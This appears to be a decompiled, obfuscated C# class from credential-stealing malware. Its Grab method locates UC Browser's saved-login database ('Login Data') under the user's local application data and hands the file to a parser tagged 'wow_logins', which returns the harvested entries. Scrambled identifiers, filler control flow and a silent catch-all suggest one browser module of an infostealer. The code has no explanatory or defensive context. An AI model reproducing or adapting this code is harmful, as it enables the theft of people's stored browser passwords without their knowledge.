using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using TMiOl;
using p3N5Y;

namespace ZAZUx;

public class NjpK : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string ah7DC5
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public NjpK()
	{
		ah7DC5 = "UC Browser";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "UCBrowser\\");
			string lNicdPOEzh = "";
			string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
			foreach (string text in files)
			{
				if (text.Contains("Login Data") & !text.EndsWith("journal"))
				{
					lNicdPOEzh = text;
					break;
				}
			}
			return TMiOl._0OgNv.tL4OBK(lNicdPOEzh, ah7DC5, "wow_logins");
		}
		catch
		{
			return new List<ii68>();
		}
	}
}
